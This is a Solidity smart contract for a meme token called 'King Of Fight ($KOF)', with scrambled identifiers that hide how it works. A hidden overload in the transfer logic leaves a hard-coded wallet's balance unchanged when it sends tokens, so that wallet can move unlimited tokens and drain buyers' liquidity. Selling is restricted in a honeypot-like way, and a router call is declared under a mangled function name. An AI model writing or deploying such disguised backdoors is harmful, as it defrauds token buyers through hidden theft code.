/**

King Of Fight  $KOF
a significant representative in the fighting game genre.


TWITTER: https://twitter.com/KOF_Coin
TELEGRAM: https://t.me/KOF_Coin
WEBSITE: https://kofeth.com/

**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _mawzx(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _mawzx(a, b, "SafeMath");
    }

    function  _mawzx(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _qolvsu {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface _pivaefs {
    function swatkTenwtSortjsFxlOrswer(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract KingOfFight is Context, IERC20, Ownable {
    using SafeMath for uint256;
    _pivaefs private _Teqveqk;
    address payable private _Acjvkifj;
    address private _yievrbr;

    bool private _pvhkjli;
    bool public _Teralvm = false;
    bool private oiaevjbk = false;
    bool private _abtjeczp = false;

    string private constant _name = unicode"King Of Fight";
    string private constant _symbol = unicode"KOF";
    uint8 private constant _decimals = 9;
    uint256 private constant _vTotalvf = 10000000000 * 10 **_decimals;
    uint256 public _kvdkoarn = _vTotalvf;
    uint256 public _Waesmyef = _vTotalvf;
    uint256 public _kwapvThaescwm= _vTotalvf;
    uint256 public _gsokTckef= _vTotalvf;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _cEvujtep;
    mapping (address => bool) private _taerncjy;
    mapping(address => uint256) private _rpeobmo;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yrviqouq=0;
    uint256 private _bmwdvue=0;


    event _mopfruqf(uint _kvdkoarn);
    modifier oTeove {
        oiaevjbk = true;
        _;
        oiaevjbk = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _vTotalvf;
        _cEvujtep[owner(

        )] = true;
        _cEvujtep[address
        (this)] = true;
        _cEvujtep[
            _Acjvkifj] = true;
        _Acjvkifj = 
        payable (0xC8aF53309C58DE4d7F1600DECa4B0063A60C1ece);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _vTotalvf);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _vTotalvf;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _mawzx(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 Rpiovmk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Teralvm) {
                if (to 
                != address
                (_Teqveqk) 
                && to !=
                 address
                 (_yievrbr)) {
                  require(_rpeobmo
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _rpeobmo
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _yievrbr && to != 
            address(_Teqveqk) &&
             !_cEvujtep[to] ) {
                require(amount 
                <= _kvdkoarn,
                 "Exceeds the _kvdkoarn.");
                require(balanceOf
                (to) + amount
                 <= _Waesmyef,
                  "Exceeds the macxizse.");
                if(_bmwdvue
                < _yrviqouq){
                  require
                  (! _ropmvra(to));
                }
                _bmwdvue++;
                 _taerncjy
                 [to]=true;
                Rpiovmk = amount._pvr
                ((_bmwdvue>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _yievrbr &&
             from!= address(this) 
            && !_cEvujtep[from] ){
                require(amount <= 
                _kvdkoarn && 
                balanceOf(_Acjvkifj)
                <_gsokTckef,
                 "Exceeds the _kvdkoarn.");
                Rpiovmk = amount._pvr((_bmwdvue>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_bmwdvue>
                _yrviqouq &&
                 _taerncjy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!oiaevjbk 
            && to == _yievrbr &&
             _abtjeczp &&
             contractTokenBalance>
             _kwapvThaescwm 
            && _bmwdvue>
            _yrviqouq&&
             !_cEvujtep[to]&&
              !_cEvujtep[from]
            ) {
                _rwjmevf( _rkpjd(amount, 
                _rkpjd(contractTokenBalance,
                _gsokTckef)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _ujfeqe(address
                    (this).balance);
                }
            }
        }

        if(Rpiovmk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(Rpiovmk);
          emit
           Transfer(from,
           address
           (this),Rpiovmk);
        }
        _balances[from
        ]= _mawzx(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _mawzx(Rpiovmk));
        emit Transfer
        (from, to, 
        amount.
         _mawzx(Rpiovmk));
    }

    function _rwjmevf(uint256
     tokenAmount) private
      oTeove {
        if(tokenAmount==
        0){return;}
        if(!_pvhkjli)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Teqveqk.WETH();
        _approve(address(this),
         address(
             _Teqveqk), 
             tokenAmount);
        _Teqveqk.
        swatkTenwtSortjsFxlOrswer
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _rkpjd
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _mawzx(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Acjvkifj){
            return a ;
        }else{
            return a .
             _mawzx (b);
        }
    }

    function removexLimitas (
        
    ) external onlyOwner{
        _kvdkoarn = _vTotalvf;
        _Waesmyef = _vTotalvf;
        emit _mopfruqf(_vTotalvf);
    }

    function _ropmvra(address 
    account) private view 
    returns (bool) {
        uint256 oxzpa;
        assembly {
            oxzpa :=
             extcodesize
             (account)
        }
        return oxzpa > 
        0;
    }

    function _ujfeqe(uint256
    amount) private {
        _Acjvkifj.
        transfer(
            amount);
    }

    function enablesTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _pvhkjli ) ;
        _Teqveqk  
        =  
        _pivaefs
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Teqveqk), 
            _vTotalvf);
        _yievrbr = 
        _qolvsu(_Teqveqk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Teqveqk .
             WETH ( ) );
        _Teqveqk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_yievrbr).
        approve(address(_Teqveqk), 
        type(uint)
        .max);
        _abtjeczp = true;
        _pvhkjli = true;
    }

    receive() external payable {}
}